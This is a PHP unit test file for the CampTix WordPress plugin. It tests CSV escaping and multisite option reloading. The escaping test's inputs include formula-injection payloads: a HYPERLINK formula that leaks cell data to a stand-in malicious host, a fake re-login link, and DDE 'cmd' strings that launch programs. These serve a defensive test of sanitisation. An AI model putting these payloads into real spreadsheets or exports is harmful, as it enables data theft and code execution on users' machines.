<?php

defined( 'WPINC' ) or die();

/**
 * @covers CampTix_Plugin
 */
class Test_CampTix_Plugin extends \WP_UnitTestCase {
	/**
	 * @covers CampTix_Plugin::esc_csv
	 */
	public function test_esc_csv() {
		$test_input = array(
			// Safe
			'CampTix',

			// Cells starting with trigger characters
			'=HYPERLINK("http://malicious.example.org/?leak="&A1,"Error: Click here to fix.")',
			'@HYPERLINK("http://malicious.example.org/wp-login.php","Please log back in to your account for more.")',
			"-2+3+cmd|' /C mstsc'!A0",
			"+2+3+cmd|' /C mspaint'!A0",
			";2+3+cmd|' /C calc'!A0",

			// Cells split by delimiters
			"foo ;=cmd|' /C SoundRecorder'!A0",
			"foo\n-2+3+cmd|' /C explorer'!A0",
			"   -2+3+cmd|' /C notepad'!A0",
			" -2+3+cmd|' /C calc'!A0",

			//mb tests
			"漢字はユニコ",
			"-漢字はユニコ ;=æ",
		);

		$expected_output = array(
			// Safe
			'CampTix',

			// Cells starting with trigger character
			'\'=HYPERLINK("http://malicious.example.org/?leak="&A1,"Error: Click here to fix.")',
			'\'@HYPERLINK("http://malicious.example.org/wp-login.php","Please log back in to your account for more.")',
			"'-2+3+cmd|' /C mstsc'!A0",
			"'+2+3+cmd|' /C mspaint'!A0",
			"';2+3+cmd|' /C calc'!A0",

			// Cells split by delimiters
			"foo ;'=cmd|' /C SoundRecorder'!A0",
			"foo\n'-2+3+cmd|' /C explorer'!A0",
			"'   '-2+3+cmd|' /C notepad'!A0",
			"' '-2+3+cmd|' /C calc'!A0",

			//mb_tests
			"漢字はユニコ",
			"'-漢字はユニコ ;'=æ",
		);

		$this->assertSame( $expected_output, CampTix_Plugin::esc_csv( $test_input ) );
	}

	/**
	 * `load_options()` should refresh `$camptix->options` for the current
	 * site, so multisite callers (like the centralized Stripe webhook) can
	 * pull in the switched-to site's settings before code that reads
	 * `$camptix->options` directly runs.
	 *
	 * @covers CampTix_Plugin::load_options
	 * @group  ms-required
	 */
	public function test_load_options_refreshes_cache_for_current_site() {
		if ( ! is_multisite() ) {
			$this->markTestSkipped( 'Multisite is required for this test.' );
		}

		/** @var CampTix_Plugin $camptix */
		global $camptix;

		$other_blog_id = self::factory()->blog->create();

		// Seed a distinct option directly on the secondary site.
		$secondary_seed = array(
			'event_name' => 'Secondary Event',
			'version'    => $camptix->version,
		);
		switch_to_blog( $other_blog_id );
		update_option( 'camptix_options', $secondary_seed );
		restore_current_blog();

		// Capture the primary site's event name before switching.
		$primary_event_name = $camptix->get_options()['event_name'];

		switch_to_blog( $other_blog_id );
		$camptix->load_options();
		$this->assertSame( 'Secondary Event', $camptix->get_options()['event_name'] );
		restore_current_blog();

		// Reload back into the primary site's options.
		$camptix->load_options();
		$this->assertSame( $primary_event_name, $camptix->get_options()['event_name'] );
	}
}
